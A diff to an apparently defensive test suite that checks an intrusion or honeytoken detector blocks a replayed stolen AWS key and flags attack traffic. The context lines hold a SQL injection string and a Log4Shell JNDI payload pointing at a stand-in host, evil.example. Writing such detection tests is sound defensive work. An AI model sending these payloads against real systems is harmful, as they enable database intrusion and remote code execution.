@@ -136,6 +136,13 @@ await step('replaying the stolen DB password from another IP is caught and block
   assert.equal(r.status, 403);
 });
 
+await step('stolen AWS key inside a SigV4 Authorization header is caught', async () => {
+  const key = /AWS_ACCESS_KEY_ID=(\S+)/.exec(envText)[1];
+  const r = await req('/api/upload', { ip: '192.0.2.98', headers: { 'user-agent': 'aws-cli/2.15',
+    authorization: `AWS4-HMAC-SHA256 Credential=${key}/20261125/eu-west-1/s3/aws4_request, SignedHeaders=host, Signature=abc` } });
+  assert.equal(r.status, 403);
+});
+
 await step('SQL injection and Log4Shell payloads are detected', async () => {
   await req(`/search?q=${encodeURIComponent("' OR 1=1--")}`, { ip: '192.0.2.31', headers: SCAN });
   await req('/', { ip: '192.0.2.32', headers: { ...SCAN, 'x-api-version': '${jndi:ldap://evil.example/a}' } });
